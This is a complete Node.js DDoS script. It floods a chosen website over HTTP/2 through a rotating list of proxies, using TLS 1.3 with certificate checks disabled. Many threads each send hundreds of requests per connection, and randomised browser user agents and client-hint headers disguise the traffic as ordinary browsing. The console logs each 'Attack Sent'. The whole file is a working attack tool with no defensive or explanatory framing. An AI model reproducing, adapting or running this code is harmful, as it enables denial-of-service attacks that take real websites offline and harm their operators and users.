const fs = require('fs');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const url = require('url');
const { connect } = require('http2');

if (process.argv.length < 6) {
    console.log("TLSv1.3 (tls)\nUsage: node tls [url] [time] [thread] [proxyfile]");
    process.exit(1);
}

const target = process.argv[2];
const time = parseInt(process.argv[3]) * 1000;
const threadCount = parseInt(process.argv[4]);
const proxyList = fs.readFileSync(process.argv[5], 'utf-8').split('\n').map(p => p.trim()).filter(Boolean);
const delay = 100;
const requestsPerThread = 750;

const stopTime = Date.now() + time;

const acceptList = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "application/json, text/javascript, */*; q=0.01",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/javascript, */*;q=0.8",
    "application/x-www-form-urlencoded;q=0.9,image/webp,image/apng,*/*;q=0.8"
];

const userAgentList = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3945.88 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.102 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.66 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3945.79 Mobile Safari/537.36"
];

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomMethod() {
    return Math.random() < 0.5 ? "GET" : "POST";
}

function randomPath() {
    const paths = ["/", "/home", "/login", "/dashboard", "/api/data", "/status"];
    return paths[Math.floor(Math.random() * paths.length)];
}

function createCustomTLSSocket(parsed, socket) {
    return tls.connect({
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384',
        minVersion: 'TLSv1.3',
        maxVersion: 'TLSv1.3',
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
            crypto.constants.SSL_OP_NO_TICKET |
            crypto.constants.SSL_OP_NO_SSLv2 |
            crypto.constants.SSL_OP_NO_SSLv3 |
            crypto.constants.SSL_OP_NO_COMPRESSION,
        echdCurve: "X25519",
        secure: true,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2'],
        host: parsed.host,
        port: 443,
        servername: parsed.host,
        socket: socket,
        timeout: 5000
    }).on('error', () => { });
}

function sendRequest(proxy, target) {
    if (Date.now() > stopTime) process.exit(0);
    const parsed = url.parse(target);
    const agent = new http.Agent({
        keepAlive: true,
        keepAliveMsecs: 500000000,
        maxSockets: 50000,
        maxTotalSockets: 100000
    });

    const Optionsreq = {
        host: proxy[0],
        port: proxy[1],
        agent: agent,
        method: 'CONNECT',
        path: parsed.host + ':443',
        timeout: 3000,
        headers: {
            'Host': parsed.host,
            'Proxy-Connection': 'Keep-Alive',
            'Connection': 'Keep-Alive'
        }
    };

    const connection = http.request(Optionsreq);
    connection.on('connect', function (res, socket) {
        socket.setKeepAlive(true, 100000);
        const tlsSocket = createCustomTLSSocket(parsed, socket);
        tlsSocket.setKeepAlive(true, 600000 * 1000);

        const client = connect(`https://${parsed.host}`, {
            createConnection: () => tlsSocket
        });

        client.on('error', () => { });

        for (let i = 0; i < requestsPerThread; i++) {
            const headers = {
                ":method": randomMethod(),
                ":authority": parsed.host,
                ":scheme": "https",
                ":path": randomPath(),
                "sec-purpose": "prefetch;prerender",
                "purpose": "prefetch",
                "sec-ch-ua": `\"Not_A Brand\";v=\"${getRandomInt(121, 345)}\", \"Chromium\";v=\"${getRandomInt(421, 6345)}\", \"Google Chrome\";v=\"${getRandomInt(421, 7124356)}\"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "MacOS",
                "upgrade-insecure-requests": "1",
                "accept": acceptList[Math.floor(Math.random() * acceptList.length)],
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7",
                "referer": "https://" + parsed.host + randomPath(),
                "user-agent": userAgentList[Math.floor(Math.random() * userAgentList.length)]
            };

            const req = client.request(headers);
            req.on('error', () => { });
            req.end();
        }
    });

    connection.on('error', () => { });
    connection.end();
}

function startThread() {
    setInterval(() => {
        if (Date.now() > stopTime) process.exit(0);
        const proxy = proxyList[Math.floor(Math.random() * proxyList.length)].split(':');
        sendRequest(proxy, target);
        console.log(`[\x1b[34m</>\x1b[0m] \x1b[31mAttack Sent\x1b[0m: [\x1b[34m${proxy.join(':')}\x1b[0m] --> [\x1b[34m${target}\x1b[0m]`);
    }, delay);
}

for (let i = 0; i < threadCount; i++) {
    startThread();
}
